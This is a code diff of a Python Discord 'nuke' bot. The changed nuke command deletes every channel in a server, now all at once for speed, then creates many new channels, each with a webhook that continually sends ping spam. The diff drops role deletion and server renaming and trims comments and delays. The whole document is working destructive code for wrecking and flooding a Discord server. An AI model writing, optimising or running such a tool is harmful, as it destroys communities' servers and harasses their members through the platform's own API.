@@ -28,7 +28,7 @@ async def spam_webhook(webhook):
             await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
             if (ping_count + 1) % 10 == 0:
                 print(f"Sent {ping_count + 1} pings in webhook {webhook.name}")
-            await asyncio.sleep(0.1)  # delay between pings
+            await asyncio.sleep(0.1)
         except Exception as e:
             print(f"❌ Webhook send failed: {e}")
 
@@ -38,46 +38,23 @@ async def nuke(ctx):
     guild = ctx.guild
     print("⚠️ Starting NUKE sequence...")
 
-    # Delete channels safely
+    # --- DELETE ALL CHANNELS FIRST ---
     channels = list(guild.channels)
     print(f"Deleting {len(channels)} channels...")
+    delete_tasks = []
     for channel in channels:
-        try:
-            await channel.delete()
-            print(f"Deleted channel: {channel.name}")
-            await asyncio.sleep(0.5)
-        except Exception as e:
-            print(f"❌ Failed to delete channel {channel.name}: {e}")
+        delete_tasks.append(channel.delete())
+    # Await all deletions concurrently for speed
+    await asyncio.gather(*delete_tasks)
+    print("✅ All channels deleted.")
 
-    # Delete roles safely
-    roles = list(guild.roles)
-    print(f"Deleting {len(roles)} roles (except @everyone)...")
-    for role in roles:
-        if role.name != "@everyone":
-            try:
-                await role.delete()
-                print(f"Deleted role: {role.name}")
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                print(f"❌ Failed to delete role {role.name}: {e}")
+    # Optional delay to ensure Discord processed the deletions
+    await asyncio.sleep(2)
 
-    # Rename server and change icon
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(guild_icon) as resp:
-                if resp.status == 200:
-                    icon_data = await resp.read()
-                    await guild.edit(name=guild_name, icon=icon_data)
-                    print(f"Server renamed to '{guild_name}' and icon updated.")
-                else:
-                    print(f"Failed to download guild icon, HTTP {resp.status}")
-    except Exception as e:
-        print(f"❌ Failed to change server name/icon: {e}")
-
-    # List to hold all spamming tasks
+    # --- CREATE CHANNELS & SPAWN SPAM TASKS ---
     spam_tasks = []
-
     print(f"Creating {channels_to_create} channels and starting spam immediately...")
+
     for i in range(channels_to_create):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
@@ -86,17 +63,17 @@ async def nuke(ctx):
             webhook = await channel.create_webhook(name=webhook_name)
             print(f"Created webhook in {channel.name}")
 
-            # Start spamming immediately as a background task
             task = asyncio.create_task(spam_webhook(webhook))
             spam_tasks.append(task)
 
-            await asyncio.sleep(0.2)  # Small delay before creating next channel
+            await asyncio.sleep(0.1)  # Slight delay before creating next channel
         except Exception as e:
             print(f"❌ Failed to create channel or webhook for channel {i}: {e}")
 
-    # Wait for all spam tasks to finish (optional, can be removed if you want to let them run forever)
-    await asyncio.gather(*spam_tasks)
+    print("✅ All channels created and spamming started.")
 
+    # Optionally wait for all spam tasks to finish (can remove if you want them to keep running)
+    await asyncio.gather(*spam_tasks)
     print("✅ NUKE complete.")
 
 if __name__ == "__main__":
